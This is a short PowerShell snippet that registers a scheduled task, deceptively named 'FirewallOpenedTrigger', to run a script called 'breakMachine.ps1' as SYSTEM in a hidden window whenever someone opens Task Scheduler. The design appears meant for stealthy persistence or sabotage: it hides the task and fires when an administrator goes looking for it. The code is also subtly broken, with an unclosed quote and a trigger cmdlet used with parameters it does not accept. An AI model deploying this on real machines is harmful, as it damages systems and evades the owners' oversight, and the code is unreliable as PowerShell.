$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -NonInteractive -WindowStyle Hidden -File "C:\PATH\breakMachine.ps1"

$trigger = New-ScheduledTaskTrigger -At "OnEvent" -Subscription @"
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
    *[System[(EventID=4688)] and EventData[Data[@Name='NewProcessName']and contains(Data, 'mmc.exe')]and EventData[Data[@Name='CommandLine']and contains(Data, 'taskschd.msc')]]
    </Select>
  </Query>
</QueryList>
"@

Register-ScheduledTask -TaskName "FirewallOpenedTrigger" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
